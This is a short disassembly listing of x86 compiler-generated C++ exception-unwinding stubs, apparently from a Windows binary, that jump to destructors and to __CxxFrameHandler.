sub_409057
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_4060e0
sub_409062
mov ecx [ ebp - 0x10 ]
add ecx 0x80
jmp sub_4060e0
sub_409070
mov eax r--data
jmp __CxxFrameHandler
sub_409080
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_4060e0
sub_40908b
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_4060e0
sub_409096
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp sub_4060e0
sub_4090a1
mov ecx [ ebp - 0x10 ]
add ecx 0x50
jmp sub_4060e0
sub_4090ac
mov ecx [ ebp - 0x10 ]
add ecx 0x60
jmp sub_4060e0
sub_4090b7
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_4060e0
sub_4090c2
mov ecx [ ebp - 0x10 ]
add ecx 0x80
jmp sub_4060e0
sub_4090d0
mov eax r--data
jmp __CxxFrameHandler
sub_4090e0
mov eax r--data
jmp __CxxFrameHandler
sub_4090f0
mov eax r--data
jmp __CxxFrameHandler
sub_409100
lea ecx [ ebp - 0x428 ]
jmp sub_4060e0
sub_40910b
mov eax r--data
jmp __CxxFrameHandler
sub_409118
lea ecx [ ebp - 0x20 ]
jmp sub_4060e0
sub_409120
mov eax r--data
jmp __CxxFrameHandler
sub_40912c
mov ecx [ ebp - 0x14 ]
jmp ??1exception@@UAE@XZ
sub_409134
mov eax r--data
jmp __CxxFrameHandler
sub_409140
mov ecx [ ebp - 0x10 ]
jmp ??1exception@@UAE@XZ
sub_409148
mov eax r--data
jmp __CxxFrameHandler
sub_409154
mov ecx [ ebp - 0x10 ]
jmp ??1exception@@UAE@XZ
sub_40915c
mov eax r--data
jmp __CxxFrameHandler
sub_409168
mov ecx [ ebp - 0x10 ]
jmp ??1exception@@UAE@XZ
sub_409170
mov eax r--data
jmp __CxxFrameHandler
sub_40917c
lea ecx [ ebp - 0x20 ]
jmp sub_4060e0
sub_409184
mov eax r--data
jmp __CxxFrameHandler
sub_409190
mov ecx [ ebp - 0x10 ]
jmp ??1exception@@UAE@XZ
sub_409198
mov eax r--data
jmp __CxxFrameHandler
